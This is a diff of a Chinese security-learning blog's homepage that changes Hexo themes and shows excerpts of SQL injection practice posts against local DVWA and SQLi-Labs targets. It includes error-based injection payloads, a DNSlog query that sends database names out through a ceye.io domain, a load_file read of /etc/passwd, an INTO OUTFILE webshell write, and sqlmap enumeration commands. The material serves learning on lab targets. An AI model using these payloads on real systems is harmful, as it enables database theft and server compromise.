@@ -1,179 +1,852 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Wyattt's blog</title><meta name="description"><meta name="author" content="Wyattt"><meta name="copyright" content="Wyattt"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://kvmtnk.top/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta property="og:type" content="website"><meta property="og:title" content="Wyattt's blog"><meta property="og:url" content="http://kvmtnk.top/"><meta property="og:site_name" content="Wyattt's blog"><meta property="og:description"><meta property="og:image" content="http://kvmtnk.top/img/r.jpg"><meta property="article:published_time" content="2020-08-21T10:04:30.643Z"><meta property="article:modified_time" content="2020-08-21T10:04:30.643Z"><meta name="twitter:card" content="summary"><script>var activateDarkMode = function () {
-  document.documentElement.setAttribute('data-theme', 'dark')
-  if (document.querySelector('meta[name="theme-color"]') !== null) {
-    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
-  }
-}
-var activateLightMode = function () {
-  document.documentElement.setAttribute('data-theme', 'light')
-  if (document.querySelector('meta[name="theme-color"]') !== null) {
-    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
-  }
-}
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-var getCookies = function (name) {
-  const value = `; ${document.cookie}`
-  const parts = value.split(`; ${name}=`)
-  if (parts.length === 2) return parts.pop().split(';').shift()
-}
+<link rel="stylesheet" href="/css/main.css">
 
-var autoChangeMode = 'false'
-var t = getCookies('theme')
-if (autoChangeMode === '1') {
-  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
-  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
-  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
-  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
 
-  if (t === undefined) {
-    if (isLightMode) activateLightMode()
-    else if (isDarkMode) activateDarkMode()
-    else if (isNotSpecified || hasNoSupport) {
-      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
-      var now = new Date()
-      var hour = now.getHours()
-      var isNight = hour <= 6 || hour >= 18
-      isNight ? activateDarkMode() : activateLightMode()
-    }
-    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
-      if (Cookies.get('theme') === undefined) {
-        e.matches ? activateDarkMode() : activateLightMode()
-      }
-    })
-  } else if (t === 'light') activateLightMode()
-  else activateDarkMode()
-} else if (autoChangeMode === '2') {
-  now = new Date()
-  hour = now.getHours()
-  isNight = hour <= 6 || hour >= 18
-  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
-  else if (t === 'light') activateLightMode()
-  else activateDarkMode()
-} else {
-  if (t === 'dark') activateDarkMode()
-  else if (t === 'light') activateLightMode()
-}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
-  root: '/',
-  algolia: undefined,
-  localSearch: undefined,
-  translate: undefined,
-  noticeOutdate: undefined,
-  copy: {
-    success: '复制成功',
-    error: '复制错误',
-    noSupport: '浏览器不支持'
-  },
-  bookmark: {
-    message_prev: '按',
-    message_next: '键将本页加入书签'
-  },
-  runtime_unit: '天',
-  runtime: false,
-  copyright: undefined,
-  ClickShowText: undefined,
-  medium_zoom: false,
-  fancybox: true,
-  Snackbar: undefined,
-  justifiedGallery: {
-    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
-    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
-  },
-  baiduPush: false,
-  highlightCopy: true,
-  highlightLang: true,
-  isPhotoFigcaption: false,
-  islazyload: true,
-  isanchor: false    
-}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
-  isPost: false,
-  isHome: true,
-  isHighlightShrink: false,
-  isSidebar: false,
-  postUpdate: '2020-08-21 18:04:30'
-}</script><noscript><style>
-#nav {
-  opacity: 1
-}
-.justified-gallery img {
-  opacity: 1
-}
-</style></noscript><meta name="generator" content="Hexo 5.0.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" data-lazy-src="/img/r.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">5</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">1</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div id="body-wrap"><header class="full_page" id="page-header" style="background-image: url(https://i.loli.net/2020/05/01/IuWi8QbHvzjlOPw.jpg)"><nav id="nav"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/">Wyattt's blog</a></span><span class="pull-right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="site-info"><h1 id="site_title">Wyattt's blog</h1><div id="site_subtitle"><span id="subtitle"></span></div><div id="site_social_icons"><a class="social-icon" href="https://github.com/kvmtnk" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div id="scroll_down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout_page" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2020/08/21/%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5DVWA/" title="利用sqlmap注入DVWA">利用sqlmap注入DVWA</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-08-21T09:15:28.000Z" title="发表于 2020-08-21 17:15:28">2020-08-21</time></span></div><div class="content">利用sqlmap工具  以DVWA为例  首先在款内输入数字2，复制浏览器上的链接http://localhost/DVWA/vulnerabilities/sqli/?id=2&amp;Submit=Submit#   
-   打开sqlmap工具   sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;   -u 网址URL      发现302重定向到了login.php,需要cookie信息
-   浏览器上按F12，复制cookie信息   
-   继续输入   sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;  --cookie=&quot;security=low;PHPSESSID=eob9vqhplaaquph45pceeqju34&quot;   成功！我们获取到了信息      the back-end ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2020/08/20/HTTP-Header%E6%B3%A8%E5%85%A5/" title="HTTP Header注入">HTTP Header注入</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-08-20T08:04:09.000Z" title="发表于 2020-08-20 16:04:09">2020-08-20</time></span></div><div class="content">HTTP头介绍https://www.cnblogs.com/52xuege/p/9271315.html
-#可以被注入的头参数
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
-cookie
-Rerferer
-User-Agent
-X-Forwarded-For
-Client-IP
-HOST
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"kvmtnk.top","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
 
-User-Agent注入以SQLi Labs靶场 Less-18关为例    用burpsuit抓包并发送给Repeater  在User-Agent处输入个单引号’进行测试  
-    出现了报错，可能存在注入
-  继续输入&#39;and extractvalue(1,concat(0x7e,(select user()),0x7e)) and &#39;1&#39;=&#39;1报错注入语句    我们得到了用户权限信息
-  输入 &#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#39;1&#39;=&#39;1    我们得到了版本信息
-Referer 注入   步骤同上
-</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2020/08/20/DNSlog%E6%B3%A8%E5%85%A5/" title="DNSlog注入">DNSlog注入</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-08-20T07:23:52.000Z" title="发表于 2020-08-20 15:23:52">2020-08-20</time></span></div><div class="content">原理
-利用细节SQL注入MYSQL条件：支持load_file()函数  高版本默认不支持
-开启allow_url_fopen  默认开启
-核心语句：select load_file(concat(&#39;\\\\&#39;,hex((select database())),&#39;.idnlnl.ceye.io\\abv&#39;));
-select load_file(concat(&#39;\\\\&#39;,(select 1111),&#39;.idnlnl.ceye.io\\abv&#39;));该语句将值1111和域名idnlnl.ceye.io拼接了起来，发起了dns查询
-concat()函数：
-concat(str1,str2,…)
-返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。mysql&gt; select concat(‘11’,’22’,’33’);
-+————————+| concat(‘11’,’22’,’33’) |
-+————————+
-| 112233 |
-+————————+
-1 row in set (0 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2020/08/20/MySQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/" title="MySQL注入之权限处理">MySQL注入之权限处理</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-08-20T07:00:18.000Z" title="发表于 2020-08-20 15:00:18">2020-08-20</time></span></div><div class="content">目标：写入webshell条件：
-mysql用户权限为root，或者有读写的权限账号
-知道网站绝对路径，（phpinfo，404，报错，爆破）可得到
-gpc是否开启，开启则单引号被转义，语句不能正常执行
-在mysql的配置文件 my.ini 中，secure_file_priv=”c:/wamp64/tmp” 被注释 或者 `secure_file_priv 配置的位置是web目录或者为空。
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Wyattt&#39;s blog">
+<meta property="og:url" content="http://kvmtnk.top/index.html">
+<meta property="og:site_name" content="Wyattt&#39;s blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="Wyattt">
+<meta name="twitter:card" content="summary">
 
-  可以读写  查询secure_file_priv状态  
+<link rel="canonical" href="http://kvmtnk.top/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Wyattt's blog</title>
   
-MYSQL读文件  mysql读文件用load_file()函数
-  12select load_file(&#39;&#x2F;etc&#x2F;passwd&#39;);select load_file(0x2F6574632F706173737764);
-写文件  INTO OUTFILE函数写文件会在每一行结束添加换行符
-  INTO DUMPFILE函数写文件会得到原生内容，这种方式对于二进制是最好的选择
 
-select ‘‘ into outfile ‘/var/www/html/muma.php’ ;
 
-selec ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2020/08/19/MySQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/" title="MySQL注入攻击">MySQL注入攻击</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-08-19T08:47:03.000Z" title="发表于 2020-08-19 16:47:03">2020-08-19</time></span></div><div class="content">什么是注入攻击  服务器在接受客户端的查询参数后，未对查询参数进行严格过滤，导致恶意用户可以在查询参数中插入恶意sql语句来查询数据库敏感信息，最终导致数据库信息泄露。
-攻击方式
-联合查询注入
-报错注入
-布尔型盲注
-延时盲注
 
-判断是否存在注入漏洞以DVWA靶场为例输入单引号’ 出现报错，可能存在sql注入
-正常输入 1SQL注入语句解析：mysql&gt; select first_name,last_name from dvwa.users; mysql&gt; select first_name,last_name from dvwa.users where user_id=&#39;1&#39;;你输入1 相当于在最后的两个单引号中间插入一个1来执行mysql的查询语句
-输入1’and’1’=’1  (1’和前面的单引号’闭合,’1和后面的单引号’闭合了)SELECT first_name, last_name FROM users WHERE user_id = &#39;1&#39; and &#39;1&#39; =&#39;1&#39;
-继续输入1’and’1’=’2S ...</div></div></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span></div></nav></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" data-lazy-src="/img/r.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Wyattt</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives"><div class="headline">文章</div><div class="length_num">5</div></a></div><div class="card-info-data-item is-center">      <a href="/tags"><div class="headline">标签</div><div class="length_num">1</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/kvmtnk" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-recent-item"><div class="aside-recent-post"><a class="aside-post-cover" href="/2020/08/21/%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5DVWA/" title="利用sqlmap注入DVWA"><img class="aside-post-bg" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="利用sqlmap注入DVWA"/></a><div class="aside-post-info"><a class="aside-post-title" href="/2020/08/21/%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5DVWA/" title="利用sqlmap注入DVWA">利用sqlmap注入DVWA</a><time class="aside-post_meta post-meta-date" datetime="2020-08-21T09:15:28.000Z" title="发表于 2020-08-21 17:15:28">2020-08-21</time></div></div><div class="aside-recent-post"><a class="aside-post-cover" href="/2020/08/20/HTTP-Header%E6%B3%A8%E5%85%A5/" title="HTTP Header注入"><img class="aside-post-bg" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTTP Header注入"/></a><div class="aside-post-info"><a class="aside-post-title" href="/2020/08/20/HTTP-Header%E6%B3%A8%E5%85%A5/" title="HTTP Header注入">HTTP Header注入</a><time class="aside-post_meta post-meta-date" datetime="2020-08-20T08:04:09.000Z" title="发表于 2020-08-20 16:04:09">2020-08-20</time></div></div><div class="aside-recent-post"><a class="aside-post-cover" href="/2020/08/20/DNSlog%E6%B3%A8%E5%85%A5/" title="DNSlog注入"><img class="aside-post-bg" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DNSlog注入"/></a><div class="aside-post-info"><a class="aside-post-title" href="/2020/08/20/DNSlog%E6%B3%A8%E5%85%A5/" title="DNSlog注入">DNSlog注入</a><time class="aside-post_meta post-meta-date" datetime="2020-08-20T07:23:52.000Z" title="发表于 2020-08-20 15:23:52">2020-08-20</time></div></div><div class="aside-recent-post"><a class="aside-post-cover" href="/2020/08/20/MySQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/" title="MySQL注入之权限处理"><img class="aside-post-bg" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MySQL注入之权限处理"/></a><div class="aside-post-info"><a class="aside-post-title" href="/2020/08/20/MySQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/" title="MySQL注入之权限处理">MySQL注入之权限处理</a><time class="aside-post_meta post-meta-date" datetime="2020-08-20T07:00:18.000Z" title="发表于 2020-08-20 15:00:18">2020-08-20</time></div></div><div class="aside-recent-post"><a class="aside-post-cover" href="/2020/08/19/MySQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/" title="MySQL注入攻击"><img class="aside-post-bg" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MySQL注入攻击"/></a><div class="aside-post-info"><a class="aside-post-title" href="/2020/08/19/MySQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/" title="MySQL注入攻击">MySQL注入攻击</a><time class="aside-post_meta post-meta-date" datetime="2020-08-19T08:47:03.000Z" title="发表于 2020-08-19 16:47:03">2020-08-19</time></div></div></div></div></div><div class="card-widget card-tags"><div class="card-content"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 16px; color: #999">网络安全</a></div></div></div><div class="card-widget card-archives"><div class="card-content"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/08/"><span class="card-archive-list-date">八月 2020</span><span class="card-archive-list-count">5</span></a></li></ul></div></div><div class="card-widget card-webinfo"><div class="card-content"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="webinfo-article-name">文章数目 :</div><div class="webinfo-article-count">5</div></div><div class="webinfo-item">      <div class="webinfo-site-uv-name">本站访客数 :</div><div class="webinfo-site-uv-count" id="busuanzi_value_site_uv"></div></div><div class="webinfo-item"><div class="webinfo-site-name">本站总访问量 :</div><div class="webinfo-site-pv-count" id="busuanzi_value_site_pv"></div></div></div></div></div></div></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 By Wyattt</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="icp"><a><img class="icp-icon" src="/img/icp.png"/><span></span></a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js" async></script><div class="js-pjax"><script>function subtitleType () {
-  $.getJSON('https://api.btstu.cn/yan/api.php?charset=utf-8&encode=json',function (data) {
-    if (true) {
-      var sub = "".length == 0 ? new Array() : "".split(',')
-      var both = sub.unshift(data.text)
-      typed = new Typed('#subtitle', {
-        strings: sub,
-        startDelay: 300,
-        typeSpeed: 150,
-        loop: true,
-        backSpeed: 50,
-      })
-    } else {
-      document.getElementById('subtitle').innerHTML = data.text
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Wyattt's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://kvmtnk.top/2020/08/21/%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5DVWA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Wyattt">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wyattt's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/08/21/%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5DVWA/" class="post-title-link" itemprop="url">利用sqlmap注入DVWA</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-08-21 17:15:28 / 修改时间：18:03:48" itemprop="dateCreated datePublished" datetime="2020-08-21T17:15:28+08:00">2020-08-21</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="利用sqlmap工具"><a href="#利用sqlmap工具" class="headerlink" title="利用sqlmap工具"></a>利用sqlmap工具</h1><p>  以DVWA为例<br>  首先在款内输入数字2，复制浏览器上的链接<a target="_blank" rel="noopener" href="http://localhost/DVWA/vulnerabilities/sqli/?id=2&amp;Submit=Submit#">http://localhost/DVWA/vulnerabilities/sqli/?id=2&amp;Submit=Submit#</a><br>   <img src="/2020/08/21/%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5DVWA/1.jpg"></p>
+<p>   打开sqlmap工具<br>   <code>sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;</code><br>   -u 网址URL<br>   <img src="/2020/08/21/%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5DVWA/2.jpg"><br>   发现302重定向到了login.php,需要cookie信息</p>
+<p>   浏览器上按F12，复制cookie信息<br>   <img src="/2020/08/21/%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5DVWA/3.jpg"></p>
+<p>   继续输入<br>   <code>sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;  --cookie=&quot;security=low;PHPSESSID=eob9vqhplaaquph45pceeqju34&quot;</code><br>   成功！我们获取到了信息<br>   <img src="/2020/08/21/%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5DVWA/4.jpg"><br>   the back-end DBMS is MySQL                                //后台数据库管理系统：MySQL<br>   back-end DBMS: MySQL &gt;= 5.0                       //后台数据库：MySQL<br>   可以布尔型盲注，报错注入，延时盲注，联合查询</p>
+<h1 id="获取数据库"><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h1><p>   –dbs  得到所有数据库<br>   输入<code>sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;  --cookie=&quot;security=low;PHPSESSID=eob9vqhplaaquph45pceeqju34&quot; --dbs </code><br>   <img src="/2020/08/21/%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5DVWA/5.jpg"></p>
+<p>   –current-db  当前数据库<br>   <img src="/2020/08/21/%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5DVWA/6.jpg"><br>   当前数据是dvwa</p>
+<h1 id="获取dvwa下的表"><a href="#获取dvwa下的表" class="headerlink" title="获取dvwa下的表"></a>获取dvwa下的表</h1><p>   –tables 表<br>   -D 数据库<br>   <code>sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;  --cookie=&quot;security=low;PHPSESSID=eob9vqhplaaquph45pceeqju34&quot; -D dvwa --tables</code><br>   <img src="/2020/08/21/%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5DVWA/7.jpg"><br>   得到两张表</p>
